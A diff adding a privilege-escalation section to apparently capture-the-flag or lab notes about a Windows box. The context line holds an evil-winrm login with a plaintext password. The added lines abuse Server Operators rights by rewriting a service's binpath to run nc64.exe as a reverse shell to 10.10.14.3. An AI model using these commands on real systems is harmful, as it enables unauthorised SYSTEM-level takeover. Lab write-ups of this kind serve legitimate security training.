@@ -41,6 +41,29 @@ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
 
 # Privilege Escalation 
 
+### See priv
+
+```shell
+whoami /priv
+```
+
+## Group priv
+
+### Server Operators 
+
+- Can edit and run service
+
+```shell
+PS C:\prog> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\prog\nc64.exe -e cmd 10.10.14.3 443"
+[SC] ChangeServiceConfig SUCCESS
+PS C:\prog> sc.exe stop VSS
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+PS C:\prog> sc.exe start VSS
+```
+
 
 # Other Tools
 
